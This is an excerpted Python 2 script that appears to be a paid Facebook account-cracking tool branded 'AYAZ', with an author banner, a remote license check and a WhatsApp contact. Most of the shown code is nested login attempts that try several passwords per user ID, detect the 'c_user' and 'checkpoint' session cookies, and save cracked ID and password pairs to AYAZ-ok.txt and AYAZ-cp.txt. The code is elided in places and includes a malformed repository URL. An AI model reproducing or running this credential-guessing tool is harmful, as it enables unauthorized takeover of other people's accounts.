...
logo = "'\x1b[1;92m' \n    ########     ###          ##    ###    \n    ##     ##   ## ##         ##   ## ##   \n    ##     ##  ##   ##        ##  ##   ##  \n    ########  ##     ##       ## ##     ## \n    ##   ##   ######### ##    ## ######### \n    ##    ##  ##     ## ##    ## ##     ## \n    ##     ## ##     ##  ######  ##     ##\n\n\n'\x1b[1;91m'   Author      :      Raees Ayaz Husssain  \n'\x1b[1;92m'   Github      :     https://github.com/786Ayaz \n'\x1b[1;92m'   KING OF     :     MALLAH\n'\x1b[1;91m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;92m'   WAP NUMBER  :     03061925319          \n"
dec = '2'
server = '2'
...
def main_apv():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/+92061925319')

    r1 = requests.get('https://raw.githubusercontent.com/MrJadugar/Try/main/approve.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_input():
    ...
    if mx == '1':
        ...
        os.system('git clone https://github.com//786 Ayaz PAID')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[AYAZ-OK] ' + coc + user + ' | ' + pass1
                ok = open('AYAZ-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[AYAZ-CP] ' + coc + user + ' | ' + pass1
                cp = open('AYAZ-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From AYAZ : ' + my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[AYAZ-OK] ' + uid + ' | ' + pass1
                ok = open('AYAZ-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[AYAZ-CP] ' + uid + ' | ' + pass1
                cp = open('AYAZ-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[AYAZ-OK] ' + uid + ' | ' + pass2
                    ok = open('AYAZ-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[AYAZ-CP] ' + uid + ' | ' + pass2
                    cp = open('AYAZ-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[AYAZ-OK] ' + uid + ' | ' + pass3
                        ok = open('AYAZ-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[AYAZ-CP] ' + uid + ' | ' + pass3
                        cp = open('AYAZ-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[AYAZ-OK] ' + uid + ' | ' + pass4
                            ok = open('AYAZ-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[AYAZ-CP] ' + uid + ' | ' + pass4
                            cp = open('AYAZ-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[AYAZ-OK] ' + uid + ' | ' + pass5
                                ok = open('AYAZ-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[AYAZ-CP] ' + uid + ' | ' + pass5
                                cp = open('AYAZ-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[AYAZ-OK] ' + uid + ' | ' + pass6
                                    ok = open('AYAZ-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[AYAZ-CP] ' + uid + ' | ' + pass6
                                    cp = open('AYAZ-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
